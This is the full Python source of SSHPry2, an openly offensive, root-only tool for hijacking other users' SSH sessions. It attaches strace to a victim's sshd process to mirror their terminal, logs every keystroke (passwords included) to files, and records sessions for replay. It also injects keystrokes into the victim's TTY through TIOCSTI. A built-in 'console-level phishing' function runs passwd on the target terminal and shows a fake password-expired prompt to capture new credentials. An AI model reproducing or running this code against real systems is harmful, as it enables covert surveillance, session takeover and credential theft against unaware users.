#!/usr/bin/env python

# SSHPry2.py Version 2.0 (GNU General Public License v 3.0)
# 
# Seamlessly monitor, control, record and replay any SSH session
# ---- Requires root privileges ----
#
# Author: Alexander Korznikov
# Twitter: @nopernik
# git: https://github.com/nopernik
# my blog: http://korznikov.com
# my challenges: http://sudo.co.il
#
# Git pulls are welcome!
#
# TODO: 
#  1. Catch write() and read() calls together without duplicates (line: 144)
#  2. Support asciinema? if needed

from subprocess import Popen, PIPE
from threading import Thread
import termios, fcntl, sys, os, re, json, zlib
import time

# Globals
class z:
   play = False
   playRaw = False
   err = ''
   writefile = ''
   sessFile = ''
   working = True
   tty = ''
   lPlay = 0.0
   speed = 4.0    # Default speed multiplier
   debug = False
   psutil = True
   pass

try:
   import psutil
except:
   z.psutil = False

print('\nSSHPry2 SSH-TTY control by @nopernik 2017\n')

def exitErr(d):
   print(d)
   sys.exit(1)
   
def usage():
   print('Usage: sshpry2.py [OPTIONS]\n')
   print('Args: --auto                # Lazy mode, auto-attach to first found session')
   print('      --list                # List available SSH Sessions')
   print('      --tty /dev/pts/XX     # Point SSHPry to specific TTY')
   print('      --raw                 # Record and Play raw term output, no timing.')
   print('      --replay <file>       # Replace previously recorded session.')
   print('      --speed 4             # Replay speed multiplier (Default: 4).\n')
   print('             ----- root privileges required! -----\n')
   if z.err: print('[-] Error: %s\n' % z.err)
   sys.exit(1)
   
if '-h' in sys.argv or '--help' in sys.argv:
   usage()
   
# Used in special keys translation
SpecialKeysDict = {
   '\x01':'[Ctrl+A]', '\x02':'[Ctrl+B]', '\x03':'[Ctrl+C]',    '\x04':'[Ctrl+D]',
   '\x05':'[Ctrl+E]', '\x06':'[Ctrl+F]', '\x07':'[Ctrl+G]',    '\x08':'[Ctrl+H]',
   '\x0b':'[Ctrl+K]', '\x0c':'[Ctrl+L]', '\x0e':'[Ctrl+N]',    '\x0f':'[Ctrl+O]',
   '\x10':'[Ctrl+P]', '\x11':'[Ctrl+Q]', '\x12':'[Ctrl+R]',    '\x13':'[Ctrl+S]',
   '\x14':'[Ctrl+T]', '\x15':'[Ctrl+U]', '\x16':'[Ctrl+V]',    '\x17':'[Ctrl+W]',
   '\x18':'[Ctrl+X]', '\x19':'[Ctrl+Y]', '\x1a':'[Ctrl+Z]',    '\x1b':'[Ctrl+[]',
   '\x1d':'[Ctrl+]]', '\x1f':'[Ctrl+/]', '\x7f':'[<--]',       '\t'  :'[Tab]',
   '\r'  :'[Enter]\r\n'
   }

def getPIDofTTY(tty):
   tty = tty.replace('/dev/','')
   proc = [i for i in os.popen('ps -ef').read().split('\n') if tty in i and 'sshd:' in i]
   if z.debug:
      for p in proc: print(p)
   if proc:
      pid = re.findall('^[^ ]+ +([0-9]+)',proc[0])[0]
   try:
      return str(int(pid))
   except:
      return False

#''' # PoC of Console-Level phishing
def phish(tty):
   print('\n\n[+] Sending phishing message!\n\n')
   message = '\033[2J\033[0;0H\r\nYour password expired and must be changed.\nEnter new UNIX password: '
   with open(tty) as f:
      for c in 'passwd\n'.decode('string_escape'): # Actual command that will be executed on target's tty.
         fcntl.ioctl(f,termios.TIOCSTI,c)
   time.sleep(0.05) # I don't know really why, but without sleep it wont work.
   with open(tty,'w') as f: 
      f.write(message)
      f.close()
#'''

def PryonTTY(b):
   # Attach to sshd process and mirror all read() syscalls to our stdout
   sshpipe = Popen(['strace', '-s', '16384', '-p', z.pid, '-e', 'read,write'], shell=False, stdout=PIPE, stderr=PIPE)
   # Create output files.
   if not os.path.isfile(z.writefile): open(z.writefile,'w').close()
   if not os.path.isfile(z.sessFile): open(z.sessFile,'w').close()
   with open(z.writefile,'a') as fo:
      fo.write('%s %s %s:\n\n' % (time.ctime(),z.tty,z.pid))
   fdR,out = '',''
   diff = 0.0
   while z.working:
      try:
         sshpipe.poll()
         output = sshpipe.stderr.readline()
         now = time.time()
         if z.lPlay: diff = now - z.lPlay
         if 'read('+fdR in output:
            if z.debug: print(output)
            # Firstly, we need to find out target tty's stdout file descriptor, so we will send ' ' then backspace to the target tty and get the output
            # Need to find more elegant way to do it.
            if not fdR:  
               fdL = re.findall('read\(([0-9]+), \".{1}\", 16384\) += 1',output)
               if isinstance(fdL,list) and len(fdL):
                  fdR = fdL[0]
                  print('\n[+] Found %s <stdout> file descriptor!' % z.tty)
                  print('[+] Let\'s rock!\n')
                  print('[!] Press Ctrl+C to exit observed session!')
                  print('[!] Be careful, your input is mirrored to %s!\n' % z.tty)
            else:
               out = re.findall('read\([0-9]+, \"(.*)\", 16384\) += [0-9]+',output)
               if isinstance(out,list) and len(out):
                  pChar = str(out[0].decode('string_escape'))
                  sys.stdout.write(pChar)
                  sys.stdout.flush()
                  z.lPlay = now
                  with open(z.sessFile, 'a') as fsess:
                     oDict = {"d":"%.2f" % diff, "v":pChar}
                     if z.playRaw:
                        fsess.write(pChar)
                     else:
                        fsess.write(json.dumps(oDict)+"\n")

         elif 'write(' in output:
            '''
            In my testing, I was unable to implement both read and write calls.
            If I print out write calls also, every input typed inside the target tty will be doubled in ours,
            for example char 't' -> 'tt'. Not so fun.
            Seems like time difference between read and write calls will do the job, but fails in 'vi' :(
            Because of that, in current version, every write call will be redirected to file.
            Any ideas?
            '''
            out = re.findall('write\([0-9]+, \"(.*)\", [0-9]+\) += 1$',output)
            if isinstance(out,list) and len(out):
               pChar = str(out[0].decode('string_escape'))
               #sys.stdout.write(pChar)
               #sys.stdout.flush()
               if pChar in SpecialKeysDict.keys(): pChar = SpecialKeysDict[pChar] # Replace special keys to readable values in output file
               with open(z.writefile,'a') as fi:
                  fi.write(pChar)

         elif not output and sshpipe.returncode is not None:
            print('\n-------------------')
            print('[!] End of session.')
            z.working = False
            break
      except:
         z.working = False
         exitErr(str(sys.exc_info()))
         
def GetKeystrokes(b):
   # Thanks to enrico.bacis - https://stackoverflow.com/a/13207724
   try:
      fd = sys.stdin.fileno()
      oldterm = termios.tcgetattr(fd)
      newattr = termios.tcgetattr(fd)
      newattr[3] = newattr[3] & ~termios.ICANON & ~termios.ECHO
      termios.tcsetattr(fd, termios.TCSANOW, newattr)
      oldflags = fcntl.fcntl(fd, fcntl.F_GETFL)
      fcntl.fcntl(fd, fcntl.F_SETFL, oldflags | os.O_NONBLOCK)

      try:
         with open(z.tty) as f: # Type ' ' and backspace to get first data, otherwise if no data received - the program will terminate
            for temp in [' ','\x7f']: 
               fcntl.ioctl(f,termios.TIOCSTI,temp)
               time.sleep(0.05)
         while z.working:
            try:
               c = sys.stdin.read(1)
               with open(z.tty) as f:
                  if c == '\x10':   # Catch Ctrl+P
                     phish(z.tty)   # and send phishing message
                     continue
                  if c == '\x04':
                     sys.stdout.write('\033[s\033[1ASSHPry: Not forwarding Ctrl+D, this will end observed session!\033[u')
                     continue
                  if c == '\n': c = '\r\n'   # tweak for some apps that won't catch \n as Enter key
                  fcntl.ioctl(f,termios.TIOCSTI,c)
            except IOError: pass
      finally:
         termios.tcsetattr(fd, termios.TCSAFLUSH, oldterm)
         fcntl.fcntl(fd, fcntl.F_SETFL, oldflags)
   except:
         print(sys.exc_info())
         z.working = False
         sys.exit(1)

def play():
   if '--speed' in sys.argv:
      z.speed = float(sys.argv[sys.argv.index('--speed')+1])
   print('Replay of session %s' % z.sessFile)
   print('------------------%s\n' % ('-'*len(z.sessFile)))
   for line in open(z.sessFile):
      try:
         if z.playRaw:
            sys.stdout.write(line.decode("string_escape"))
            sys.stdout.flush()
         else:
            d = json.loads(line)
            now = float(d["d"])
            tSleep = (float(now)/z.speed)
            if tSleep > 60: tSleep = 10 # we don't want to wait more than 10 seconds to see what happens next
            time.sleep(tSleep)
            sys.stdout.write(d["v"].decode("string_escape"))
            sys.stdout.flush()
      except:
         print('Session file %s not in correct format' % z.sessFile)
         print(sys.exc_info())
         break
   print('\n\nEnd of session replay.\n')
  
def main():
   if not len(sys.argv[1:]):
      usage()
   ExecTimeStamp = time.strftime("%Y-%m-%d-%H%M", time.localtime())
   z.writefile = 'keys-%s.sshpry.log' % ExecTimeStamp
   z.sessFile = 'sess-%s.sshpry.log' % ExecTimeStamp
   if '--replay' in sys.argv:
      z.sessFile = sys.argv[sys.argv.index('--replay')+1]
      if not os.path.isfile(z.sessFile): 
         z.err = 'Cannot open %s' % z.sessFile
         usage()
      z.play = True
   if '--raw' in sys.argv:
      z.playRaw = True
      
   if not z.play:
      if os.geteuid() != 0:
         exitErr('[-] You need root privileges to use SSHPry.\n')

      # Check if we are running in a TTY
      if not sys.stdout.isatty():
         exitErr('[-] Sorry, your shell is not a TTY shell.\nTry to spawn PTY with python\n')

      # Get self tty
      mytty = os.ttyname(sys.stdout.fileno()).replace('/dev/','')
      if z.debug: print(mytty)
      
      # Get active ssh connections
      print('[+] Getting available ssh connections...')
      if z.psutil: ttys = [(i.terminal,i.name) for i in psutil.users() if '/' in i.terminal and not mytty == i.terminal]
      else: ttys = [(t.split()[1],t.split()[0]) for t in os.popen('last').read().split('\n') if 'logged' in t and '/' in t and not t.split()[1] == mytty]
      
      if '--tty' in sys.argv and not '--list' in sys.argv:
         z.tty = sys.argv[sys.argv.index('--tty')+1]
         z.pid = getPIDofTTY(z.tty)
         if not os.path.exists(z.tty) or not z.pid:
            exitErr('\n[-] TTY %s does not exists!\n' % z.tty)
      if len(ttys) and not z.tty:
         print('[+] Found active SSH connections:')
         for t,u in ttys:
            print('\tPID: %s | TTY: /dev/%s (%s)\n' % (getPIDofTTY(t),t,u))
         if not '--auto' in sys.argv:
            print('[!] Choose yours with "--tty TTY" switch\n')
            sys.exit(0)
         else:
            print('[+] -- Lazy mode activated -- :-)\n')
            z.tty = '/dev/'+ttys[0][0]
            z.pid = getPIDofTTY(z.tty)
      elif len(ttys) == 0:
         exitErr('[-] No ssh connections found.\n')
      if not z.tty:
         usage()
         
      z.tty = z.tty.strip()
      print('[+] Target TTY keystrokes file: %r' % z.writefile)
      print('[+] Target TTY session file: %r' % z.sessFile)
      print('\n[+] Attaching to %s at %s...' % (z.pid, z.tty))
      t1 = Thread(target=PryonTTY,args=(0,))
      t1.start()
      time.sleep(1)
      t2 = Thread(target=GetKeystrokes,args=(0,))
      t2.start()
      t1.join()   # Wait for until z.working == False
   elif z.play:
      play()
   else:
      usage()
      
if __name__ == "__main__":
   try:
      main()
   except IndexError:
      z.err = 'Argument value missing.'
      usage()
   except KeyboardInterrupt:
      print('\n\n[!] Ctrl+C detected...\nSee you!\n')
      z.working = False